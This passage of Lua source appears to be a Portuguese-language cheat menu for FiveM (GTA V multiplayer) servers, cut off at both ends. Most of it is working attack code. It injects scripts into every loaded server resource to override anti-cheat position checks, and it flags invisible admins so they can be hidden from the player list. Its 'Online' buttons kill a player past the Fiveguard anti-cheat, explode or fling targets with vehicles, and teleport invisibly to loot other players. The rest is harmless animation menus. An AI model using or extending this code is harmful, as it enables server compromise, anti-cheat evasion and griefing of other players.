                _G.IsEntityCollisionDisabled   = function() return false end
                _G.GetEntitySpeed              = function() return 0.0 end
            end

            pcall(function()
                tpOverrides()
                tpDetection()
            end)

            while _hxp_tp_ver == myVersion do
                pcall(tpOverrides)
                pcall(tpDetection)
                Wait(500)
            end
        end)
        ]])
    end

    local ped = PlayerPedId()
    local pracaCoords = vector3(1079.6988525391, -3172.0288085938, 5.9007720947266)
    SetEntityCoordsNoOffset(ped, pracaCoords.x, pracaCoords.y, pracaCoords.z, false, false, false, false)
end)

next.elements.button("Teleportar para o Aeroporto", "teleportar_para_aeroporto", function()
    for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
        FrameAPI.Inject(resourceName, [[
        Citizen.CreateThread(function()
            _hxp_tp_ver = (_hxp_tp_ver or 0) + 1
            local myVersion = _hxp_tp_ver

            local function tpOverrides()
                SetEntityCoords                = function() return true end
                SetEntityCoordsNoOffset        = function() return true end
                SetPedCoordsKeepVehicle        = function() return true end
                SetEntityHeading               = function() return true end
                FreezeEntityPosition           = function() return true end
                SetEntityVelocity              = function() return true end
                SetEntityCollision             = function() return true end
                _G.SetEntityCoords             = function() return true end
                _G.SetEntityCoordsNoOffset     = function() return true end
                _G.SetPedCoordsKeepVehicle     = function() return true end
                _G.SetEntityHeading            = function() return true end
                _G.FreezeEntityPosition        = function() return true end
                _G.SetEntityVelocity           = function() return true end
                _G.SetEntityCollision          = function() return true end
            end

            local function tpDetection()
                IsEntityPositionFrozen         = function() return false end
                IsEntityCollisionDisabled      = function() return false end
                GetEntitySpeed                 = function() return 0.0 end
                _G.IsEntityPositionFrozen      = function() return false end
                _G.IsEntityCollisionDisabled   = function() return false end
                _G.GetEntitySpeed              = function() return 0.0 end
            end

            pcall(function()
                tpOverrides()
                tpDetection()
            end)

            while _hxp_tp_ver == myVersion do
                pcall(tpOverrides)
                pcall(tpDetection)
                Wait(500)
            end
        end)
        ]])
    end

    local ped = PlayerPedId()
    local pracaCoords = vector3(-992.30926513672, -2847.75, 13.964544296265)
    SetEntityCoordsNoOffset(ped, pracaCoords.x, pracaCoords.y, pracaCoords.z, false, false, false, false)
end)

next.elements.button("Teleportar para o Banco Central", "teleportar_para_bc", function()
    for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
        FrameAPI.Inject(resourceName, [[
        Citizen.CreateThread(function()
            _hxp_tp_ver = (_hxp_tp_ver or 0) + 1
            local myVersion = _hxp_tp_ver

            local function tpOverrides()
                SetEntityCoords                = function() return true end
                SetEntityCoordsNoOffset        = function() return true end
                SetPedCoordsKeepVehicle        = function() return true end
                SetEntityHeading               = function() return true end
                FreezeEntityPosition           = function() return true end
                SetEntityVelocity              = function() return true end
                SetEntityCollision             = function() return true end
                _G.SetEntityCoords             = function() return true end
                _G.SetEntityCoordsNoOffset     = function() return true end
                _G.SetPedCoordsKeepVehicle     = function() return true end
                _G.SetEntityHeading            = function() return true end
                _G.FreezeEntityPosition        = function() return true end
                _G.SetEntityVelocity           = function() return true end
                _G.SetEntityCollision          = function() return true end
            end

            local function tpDetection()
                IsEntityPositionFrozen         = function() return false end
                IsEntityCollisionDisabled      = function() return false end
                GetEntitySpeed                 = function() return 0.0 end
                _G.IsEntityPositionFrozen      = function() return false end
                _G.IsEntityCollisionDisabled   = function() return false end
                _G.GetEntitySpeed              = function() return 0.0 end
            end

            pcall(function()
                tpOverrides()
                tpDetection()
            end)

            while _hxp_tp_ver == myVersion do
                pcall(tpOverrides)
                pcall(tpDetection)
                Wait(500)
            end
        end)
        ]])
    end

    local ped = PlayerPedId()
    local pracaCoords = vector3(228.45106506348, 213.3466796875, 105.51865386963)
    SetEntityCoordsNoOffset(ped, pracaCoords.x, pracaCoords.y, pracaCoords.z, false, false, false, false)
end)
                            next.elements.button("pegar coords", "pegarcoords", function()
                                local ped = PlayerPedId()
                                local pedCoords = GetEntityCoords(ped)
                                my.interact.Notify(string.format("X: %.2f | Y: %.2f | Z: %.2f", pedCoords.x, pedCoords.y, pedCoords.z), "Coordenadas", my.fontAwesome.icons.marker, 6500)
                            end)
                            next.elements.groupbox("Teleportes Salvos", "tpsvalos", "\xef\x83\xa2", 0, 305, 545, 140)
                            local function loadSavedTeleports()
                                local saved = FrameAPI.GetVar("savedTeleports")
                                if type(saved) == "table" then
                                    return saved
                                end
                                if type(saved) == "string" and saved ~= "" then
                                    local ok, decoded = pcall(json.decode, saved)
                                    if ok and type(decoded) == "table" then
                                        return decoded
                                    end
                                end
                                return {}
                            end
                            next.vars.savedTeleports = loadSavedTeleports()
                        next.elements.input("Nome do Teleporte", "teleporte_nome", "")
                        next.elements.button("Salvar Teleporte", "salvar_teleporte", function()
                            local ped = PlayerPedId()
                            local coords = GetEntityCoords(ped)
                            local name = next.values.input["teleporte_nome"]
                            if not name or name == "" then
                                next.elements.notify("Digite um nome para o teleporte!", "warning")
                                return
                            end
                            table.insert(next.vars.savedTeleports, {
                                name = name,
                                coords = {x = coords.x, y = coords.y, z = coords.z}
                            })
                            FrameAPI.SetVar("savedTeleports", json.encode(next.vars.savedTeleports))
                            saveCloudConfig()
                            next.elements.notify("Teleporte salvo como: " .. name, "success")
                        end)
                        next.vars.savedTeleports = loadSavedTeleports()
                        for index, tp in ipairs(next.vars.savedTeleports) do
                            next.elements.button(tp.name, "tp_" .. index, function()
                                if next.vars.selected_teleport == index then
                                    next.vars.selected_teleport = nil
                                else
                                    next.vars.selected_teleport = index
                                end
                            end)
                            if next.vars.selected_teleport == index then
                                next.elements.button("Teleportar para " .. tp.name, "ir_" .. index, function()
                                    local ped = PlayerPedId()
                                    local c = tp.coords
                                    SetEntityCoordsNoOffset(ped, c.x, c.y, c.z, false, false, false, true)
                                    next.elements.notify("Teleportado para: " .. tp.name, "success")
                                end)
                                next.elements.button("Eliminar " .. tp.name, "del_" .. index, function()
                                    table.remove(next.vars.savedTeleports, index)
                                    FrameAPI.SetVar("savedTeleports", json.encode(next.vars.savedTeleports))
                                    saveCloudConfig()
                                    next.vars.selected_teleport = nil
                                    next.elements.notify("Teleporte eliminado!", "info")
                                end)
                            end
                        end
                        elseif next.vars.subtab_selected == "Animações" then
                        next.elements.groupbox("Animações Andar", "animaodscas", "\xee\x94\xb3", 0, 0, 270, 220)
                        next.elements.button("Voltar ao normal","cancelar_anim_andar", function()
                                ResetPedMovementClipset(PlayerPedId())
                            end)
                                next.elements.button("Modo Homem","modo_homem", function()
                                local clipset = "move_m@casual@a"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Mulher","modo_mulher", function()
                                local clipset = "move_f@heels@c"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Depressivo","modo_depressivo", function()
                                local clipset = "move_m@bag"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Depressiva","modo_depressiva", function()
                                local clipset = "move_f@bag"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Determinado","modo_determinado", function()
                                local clipset = "move_m@brave"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Descontraido","modo_descontraido", function()
                                local clipset = "move_m@casual@a"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Farto","modo_farto", function()
                                local clipset = "move_m@injured"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Estiloso","modo_estiloso", function()
                                local clipset = "move_m@femme@"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Ferido","modo_ferido", function()
                                local clipset = "move_m@injured"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Nervoso","modo_nervoso", function()
                                local clipset = "move_m@quick"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Desleixado","modo_desleixado", function()
                                local clipset = "move_m@drunk@a"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Desligado","modo_desligado", function()
                                local clipset = "move_m@prison_gaurd"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Fadiga","modo_fadiga", function()
                                local clipset = "move_m@sad@a"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Apressado","modo_apressado", function()
                                local clipset = "move_m@hurry@a"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Corridinha","modo_corridinha", function()
                                local clipset = "sprint@kid"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Piriguete","modo_piriguete", function()
                                local clipset = "move_f@sexy@a"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Bebado","modo_bebado", function()
                                local clipset = "move_m@drunk@moderatedrunk"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Bebado2","modo_bebado2", function()
                                local clipset = "move_m@drunk@verydrunk"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Bebado3","modo_bebado3", function()
                                local clipset = "move_m@drunk@slightlydrunk"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Irritado","modo_irritado", function()
                                local clipset = "move_m@angry"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Chateado","modo_chateado", function()
                                local clipset = "move_f@depressed@a"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Estilosa","modo_estilosa", function()
                                local clipset = "move_f@femme@"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                                next.elements.button("Modo Sensual","modo_sensual", function()
                                local clipset = "move_f@sassy"
                                RequestAnimSet(clipset)
                                while not HasAnimSetLoaded(clipset) do Wait(0) end
                                SetPedMovementClipset(PlayerPedId(), clipset, 0.2)
                                end)
                        next.elements.groupbox("Animações Objetos", "animaodscas_objetos", "\xee\x94\xb3", 280, 0, 270, 220)
                        next.elements.button("Cancelar Anim Objeto", "cancelar_anim_objeto", function()
                            ClearPedTasks(PlayerPedId())
                        end)
                            next.elements.button("Objeto Caixa de Mendigo", "caixa_de_mendigo", function()
                            local dict, anim = "anim@heists@box_carry@", "idle"
                            local flag = 50
                            RequestAnimDict(dict)
                            while not HasAnimDictLoaded(dict) do Wait(0) end
                            TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, flag, 0, false, false, false)
                            end)
                            next.elements.button("Objeto Camera de Cinema", "camera_de_cinema", function()
                            local dict, anim = "missfinale_c2mcs_1", "fin_c2_mcs_1_camman"
                            local flag = 49
                            RequestAnimDict(dict)
                            while not HasAnimDictLoaded(dict) do Wait(0) end
                            TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, flag, 0, false, false, false)
                            end)
                            next.elements.button("Objeto Anotar", "anotar", function()
                            local dict, anim = "amb@medic@standing@timeofdeath@base", "base"
                            local flag = 49
                            RequestAnimDict(dict)
                            while not HasAnimDictLoaded(dict) do Wait(0) end
                            TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, flag, 0, false, false, false)
                            end)
                            next.elements.button("Objeto Segurar Pneu", "segurar_pneu", function()
                            local dict, anim = "anim@heists@box_carry@", "idle"
                            local flag = 49
                            RequestAnimDict(dict)
                            while not HasAnimDictLoaded(dict) do Wait(0) end
                            TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, flag, 0, false, false, false)
                            end)
                            next.elements.button("Objeto Britadeira", "britadeira", function()
                            local dict, anim = "amb@world_human_const_drill@male@drill@base", "base"
                            local flag = 15
                            RequestAnimDict(dict)
                            while not HasAnimDictLoaded(dict) do Wait(0) end
                            TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, flag, 0, false, false, false)
                            end)
                            next.elements.button("Objeto Martelo", "martelo", function()
                            local dict, anim = "amb@world_human_hammering@male@base", "base"
                            local flag = 49
                            RequestAnimDict(dict)
                            while not HasAnimDictLoaded(dict) do Wait(0) end
                            TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, flag, 0, false, false, false)
                            end)
                            next.elements.groupbox("Animações Basica", "animaodscas_basica", "\xee\x94\xb3", 0, 225, 270, 200)
                            next.elements.button("Cancelar Anim Básica", "cancelar_anim_basica", function()
                                ClearPedTasks(PlayerPedId())
                                ClearPedTasksImmediately(PlayerPedId())
                                end)
                                next.elements.button("Animação Sentar", "animação_sentar", function()
                                local dict, anim = "amb@world_human_picnic@male@base", "base"
                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do Wait(0) end
                                TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, 1, 0, false, false, false)
                                end)
                                next.elements.button("Animação Dormir", "animação_dormir", function()
                                local dict, anim = "anim@heists@ornate_bank@hostages@hit", "hit_react_die_loop_ped_a"
                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do Wait(0) end
                                TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, 1, 0, false, false, false)
                                end)
                                next.elements.button("Animação Encostar", "animação_encostar", function()
                                local dict, anim = "amb@lo_res_idles@", "world_human_lean_male_foot_up_lo_res_base"
                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do Wait(0) end
                                TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, 1, 0, false, false, false)
                                end)
                                next.elements.button("Animação Dançar", "animação_dancar", function()
                                local dict, anim = "rcmnigel1bnmt_1b", "dance_loop_tyler"
                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do Wait(0) end
                                TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, 1, 0, false, false, false)
                                end)
                                next.elements.button("Animação Alongar", "animação_alongar", function()
                                local dict, anim = "anim@deathmatch_intros@unarmed", "intro_male_unarmed_e"
                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do Wait(0) end
                                TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, 1, 0, false, false, false)
                                end)
                                next.elements.button("Animação Yoga", "animação_yoga", function()
                                local dict, anim = "missfam5_yoga", "f_yogapose_a"
                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do Wait(0) end
                                TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, 1, 0, false, false, false)
                                end)
                                next.elements.button("Animação Flexão", "animação_flexão", function()
                                local dict, anim = "amb@world_human_push_ups@male@base", "base"
                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do Wait(0) end
                                TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, 1, 0, false, false, false)
                                end)
                                next.elements.button("Animação Abdominal", "animação_abdominal", function()
                                local dict, anim = "amb@world_human_sit_ups@male@base", "base"
                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do Wait(0) end
                                TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, 1, 0, false, false, false)
                                end)
                            next.elements.groupbox("Animações Troll", "animaçoes_troll", "\xee\x94\xb3", 280, 225, 270, 200)
                            next.elements.button("Cancelar Anim Troll", "cancelar_anim_troll", function()
                                ClearPedTasks(PlayerPedId())
                                ClearPedTasksImmediately(PlayerPedId())
                                end)
                                next.elements.button("Animação Sexo", "animação_sexo", function()
                                local dict, anim = "rcmpaparazzo_2", "shag_loop_poppy"
                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do Wait(0) end
                                TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, 1, 0, false, false, false)
                                end)
                                next.elements.button("Animação Rebolar", "animação_rebolar", function()
                                local dict, anim = "switch@trevor@mocks_lapdance", "001443_01_trvs_28_idle_stripper"
                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do Wait(0) end
                                TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, 1, 0, false, false, false)
                                end)
                                next.elements.button("Animação Rastejar", "animação_rastejar", function()
                                local dict, anim = "move_crawl", "onfront_fwd"
                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do Wait(0) end
                                TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, 1, 0, false, false, false)
                                end)
                                next.elements.button("Animação Mostrar Peitos", "animação_mostrar_peitos", function()
                                local dict, anim = "mini@strip_club@backroom@", "stripper_b_backroom_idle_b"
                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do Wait(0) end
                                TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, 0, 0, false, false, false)
                                end)
                                next.elements.button("Animação Poledance", "animação_poledance", function()
                                local dict, anim = "mini@strip_club@pole_dance@pole_dance1", "pd_dance_01"
                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do Wait(0) end
                                TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, 1, 0, false, false, false)
                                end)
                                next.elements.button("Animação Coçar o Saco", "animação_coçar_saco", function()
                                local dict, anim = "mp_player_int_uppergrab_crotch", "mp_player_int_grab_crotch"
                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do Wait(0) end
                                TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, 1, 0, true, false, false)
                                end)
                                next.elements.button("Animação Coçar o Cu", "animação_coçar_cu", function()
                                local dict, anim = "mp_player_int_upperarse_pick", "mp_player_int_arse_pick"
                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do Wait(0) end
                                TaskPlayAnim(PlayerPedId(), dict, anim, 8.0, -8.0, -1, 1, 0, true, false, false)
                                end)
                    end
                elseif next.vars.tab_selected == "Online" then
                    if next.vars.subtab_selected == "Players" then
                        next.elements.groupbox("Lista de Players", "playersListBox", "\xee\x94\xb3", 0, 0, 270, 300)
                        next.elements.input("Pesquisar:", "search:player", "", true)
next._playerListCache = next._playerListCache or {}
next._playerListLastSort = next._playerListLastSort or 0
local now = GetGameTimer()
if now - next._playerListLastSort > 200 then
    local ped = PlayerPedId()
    local pedCoords = GetEntityCoords(ped)
    local filter = next.values.input and next.values.input["search:player"] or ""
    filter = filter:lower()
    local players = {}
    local allPlayers = GetActivePlayers and GetActivePlayers() or {}
    for _, playerServerId in ipairs(allPlayers) do
        local pid = GetPlayerPed(playerServerId)
        if DoesEntityExist(pid) then
            local name = GetPlayerName(playerServerId) or "Desconhecido"
            if filter ~= "" then
                if not (name:lower():find(filter, 1, true)) then
                    goto continue_player_sort
                end
            end
            local pcoords = GetEntityCoords(pid)
            local distance = #(pedCoords - pcoords)
            local isSelf = (playerServerId == PlayerId())
            local isInvisible = not IsEntityVisibleToScript(pid)
            table.insert(players, {
                pid = playerServerId,
                name = name,
                distance = distance,
                isSelf = isSelf,
                isInvisible = isInvisible
            })
        end
        ::continue_player_sort::
    end
    table.sort(players, function(a, b)
        return a.distance < b.distance
    end)
    next._playerListCache = players
    next._playerListLastSort = now
end
local ped = PlayerPedId()
local pedCoords = GetEntityCoords(ped)
for _, pData in ipairs(next._playerListCache) do
    local pid = GetPlayerPed(pData.pid)
    if DoesEntityExist(pid) then
        local health = GetEntityHealth(pid)
        local isDead = false
        if IsEntityDead(pid) then
            isDead = true
        elseif IsPedDeadOrDying(pid, true) then
            isDead = true
        elseif IsPedFatallyInjured(pid) then
            isDead = true
        elseif health <= 100 or health <= 0 then
            isDead = true
        elseif IsPlayerDead(pData.pid) then
            isDead = true
        end
        local showPlayer = true
        if next.values.checkbox["filter_alive"] and isDead then
            showPlayer = false
        end
        if next.values.checkbox["filter_dead"] and not isDead then
            showPlayer = false
        end
        local isNowInvisible = not IsEntityVisibleToScript(pid)
        if next.values.checkbox["hide_admins"] and isNowInvisible then
            showPlayer = false
        end
        if showPlayer then
            local pcoords = GetEntityCoords(pid)
            pData.distance = #(pedCoords - pcoords)
            pData.isSelf = (pData.pid == GetPlayerServerId())
            local selectedlplayerlist = next.lib.selected_player == pData.pid
            local vtext = string.format("%.0f", pData.distance) .. "m"
            local displayName = pData.name
            if next.values.checkbox["show_ids"] then
                displayName = "[" .. pData.pid .. "] " .. displayName
            end
            local extraInfo = ""
            if next.values.checkbox["show_radios"] then
                local radioText = "[Sem Radio]"
                local plyState = Player(pData.pid).state
                if plyState and plyState.radioChannel and plyState.radioChannel ~= 0 then
                    radioText = "[Radio: " .. plyState.radioChannel .. "]"
                end
                extraInfo = string.format("%s - %s", radioText, vtext)
            else
                extraInfo = "- " .. vtext
            end
            local statusTag = ""
            if isDead then
                statusTag = " [Morto]"
            end
            if isNowInvisible then
                statusTag = statusTag .. " [ADMIN]"
            end
            local selfTag = pData.isSelf and " [Você]" or ""
            local customDisplayName = string.format("%s%s%s %s", displayName, statusTag, selfTag, extraInfo)
            if #customDisplayName > 40 then
                customDisplayName = customDisplayName:sub(1, 40) .. "..."
            end
            local r, g, b = 96, 96, 96
            local rgb = next.functions.RGBnext(4.0)
            if selectedlplayerlist then
                r, g, b = 0, 0, 240
            elseif isNowInvisible then
                r, g, b = rgb.r, rgb.g, rgb.b
            elseif isDead then
                r, g, b = 255, 0, 0
            end
            next.elements.list(
                pData.pid,
                selectedlplayerlist,
                function()
                    if selectedlplayerlist then
                        next.lib.selected_player = nil
                    else
                        next.lib.selected_player = pData.pid
                    end
                end,
                customDisplayName,
                r, g, b
            )
        end
    end
end
end
                    next.elements.groupbox("Config Lista", "configlista", "\xef\x80\x93", 0, 305, 270, 140)
                        next.elements.checkbox("Mostrar Apenas Vivos", "filter_alive", function()
                        end)
                        next.elements.checkbox("Mostrar Apenas Mortos", "filter_dead", function()
                        end)
                        next.elements.checkbox("Mostrar Id", "show_ids", function()
                        end)
                        next.elements.checkbox("Mostrar Radio", "show_radios", function()
                        end)
                        next.elements.checkbox("Ocultar Admin da Lista", "hide_admins", function()
                        end)
                        next.elements.groupbox("Options Online", "onlineOP", "\xee\x93\xa9", 280, 0, 270, 300)

                        next.elements.button("Ir No Player", "teleportar_para_player", function()
                            local a = PlayerPedId()
                            local tped = GetPlayerPed(next.lib.selected_player)
                            SetPedCoordsKeepVehicle(a, GetEntityCoords(tped))
                        end)
                        next.elements.button("Copiar Roupas","copiar_roupa", function()
                            local player = GetPlayerPed(next.lib.selected_player)
                            FrameAPI.Scripting.HookNative(0xE952D6431689AD9A, false)
                            ClonePedToTarget(player,PlayerPedId())
                        end)

                        next.elements.button("Copiar Ped","copiar_ped", function()
                        local pedSelecionado = GetPlayerPed(next.lib.selected_player)
                        local meuPed = PlayerPedId()
                        local modeloPedSelecionado = GetEntityModel(pedSelecionado)
                        local meuModeloPed = GetEntityModel(meuPed)

                        local modelHash = GetEntityModel(pedSelecionado)

                        FrameAPI.Inject('vrp', string.format([[
                        tvRP.Skin(%s)
                        ]],modelHash))
                    end)


                        next.vars.savedOutfits = 0
                        next.elements.button("Carros no Player", "carrain", function()
                            local ped = GetPlayerPed(next.lib.selected_player)
                            local coords = GetEntityCoords(ped)
                            for i, vehicle in pairs(next.controlled_vehicles) do
                                SetEntityCoordsNoOffset(vehicle, coords.x, coords.y, coords.z + 20.0, false, false, false)
                                SetEntityRotation(vehicle, math.random(10, 180), math.random(10, 180), math.random(10, 180), 2, true)
                                SetEntityVelocity(vehicle, 0.0, 0.0, -100.0)
                            end
                        end)
                        
if anticheat == "Fiveguard" then
next.elements.button("Matar Player Perm","matarplayerperm", function()
    local a = PlayerPedId()
    local tped = GetPlayerPed(next.lib.selected_player)
    local coords = GetEntityCoords(tped)
    ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z + 10.0, coords.x, coords.y, coords.z, 1000, true, GetHashKey('WEAPON_TRANQUILIZER'), PlayerPedId(), true, false, -1.0, true)
end)
end
next.elements.checkbox("Banir Player","banirplayerperm", function(extint)
    if extint then
    while next.values.checkbox["banirplayerperm"]  do 
    Wait(0)
    local ped = GetPlayerPed(next.lib.selected_player)
    SetPedCanBeDraggedOut(ped,true)
    end
    end
end)
next.elements.button("Explodir Player com Carro", "explodir_player_carro", function()
    nt.createTh(function()
        local vehicle_found = nil
        for k, veh in ipairs(GetGamePool("CVehicle")) do
            local vehHealth = GetEntityHealth(veh)
            if NetworkHasControlOfEntity(veh) and vehHealth > 250 then
                vehicle_found = veh
                break
            end
        end
        if vehicle_found then
            local ped = GetPlayerPed(next.lib.selected_player)
            local coords = GetEntityCoords(ped)
            SetEntityCoordsNoOffset(vehicle_found, coords.x, coords.y, coords.z)
            SetEntityHeading(vehicle_found, GetEntityHeading(vehicle_found) + 10)
            SetEntityVisible(vehicle_found, false)
            AddVehiclePhoneExplosiveDevice(vehicle_found)
            Wait(100)
            DetonateVehiclePhoneExplosiveDevice(vehicle_found)
        end
    end)
end)
next.elements.button("Lançar Player", "lançarplayer", function()
GetNearestCar = function(radius)
	local playerPed = PlayerPedId()
	local playerVeh = GetVehiclePedIsIn(playerPed, false)
	local playerCoords = GetEntityCoords(playerPed)
	local closestVeh = 0
	local minDist = radius or 50.0
	
	if GetGamePool then
		for _, veh in ipairs(GetGamePool("CVehicle")) do
			if DoesEntityExist(veh) and veh ~= playerVeh then
				local coords = GetEntityCoords(veh)
				local dist = #(playerCoords - coords)
				if dist < minDist then
					minDist = dist
					closestVeh = veh
				end
			end
		end
	else
		local maybeVeh = GetClosestVehicle(playerCoords, minDist, 0, 70)
		if maybeVeh ~= 0 and maybeVeh ~= playerVeh then
			closestVeh = maybeVeh
		end
	end

	return closestVeh
end

RequestControl = function(entity)
	NetworkRequestControlOfEntity(entity)
	NetworkRequestControlOfEntity(entity)
	local timeout = GetGameTimer() + 3000
	while (not NetworkHasControlOfEntity(entity)) and GetGameTimer() < timeout do
		Citizen.Wait(10)
		NetworkRequestControlOfEntity(entity)
	end
end
	CreateThread(function()
		local playerPed = PlayerPedId()
		local d = GetEntityCoords(playerPed)
		local selected_ped = GetPlayerPed(next.lib.selected_player)
		
		if not DoesEntityExist(selected_ped) or not IsEntityAPed(selected_ped) then
			print("Nenhum ped válido selecionado")
			return
		end
		
		if selected_ped == playerPed then
			print("Não pode lançar a si mesmo")
			return
		end
		
		local nearestVehicle = GetNearestCar(300)
		
		if not DoesEntityExist(nearestVehicle) then
			print("Nenhum veículo encontrado")
			return
		end
		
		RequestControl(nearestVehicle)
		
		if not NetworkHasControlOfEntity(nearestVehicle) then
			print("Não foi possível obter controle do veículo")
			return
		end
		
		SetPedIntoVehicle(playerPed, nearestVehicle, -1)
		
		AttachEntityToEntityPhysically(
			nearestVehicle,          
			selected_ped,            
			0.0,                    
			0.0,                     
			0.0,                     
			0.0,                     
			0.0,                     
			0.0,                     
			99999.0,                
			99999.0,                 
			false,                  
			true,                   
			false,                   
			false,                   
			0                        
		)
		
		ClearPedTasks(playerPed)
		
		SetEntityVisible(playerPed, true, true)
		SetEntityCoordsNoOffset(playerPed, d.x, d.y, d.z, true, true, false)
		
		Wait(1)
	end)
end)
                next.elements.button("Revistar Player", "revistarplayer", function()
                    local hisCoords = GetEntityCoords(GetPlayerPed(next.lib.selected_player))
                    local coords = GetEntityCoords(PlayerPedId())
                    SetEntityCoordsNoOffset(PlayerPedId(),hisCoords)
                    SetEntityVisible(PlayerPedId(), false)
                    SetEntityCoordsNoOffset(PlayerPedId(),hisCoords)
                    ExecuteCommand("saquear")
                    ExecuteCommand("revistar")
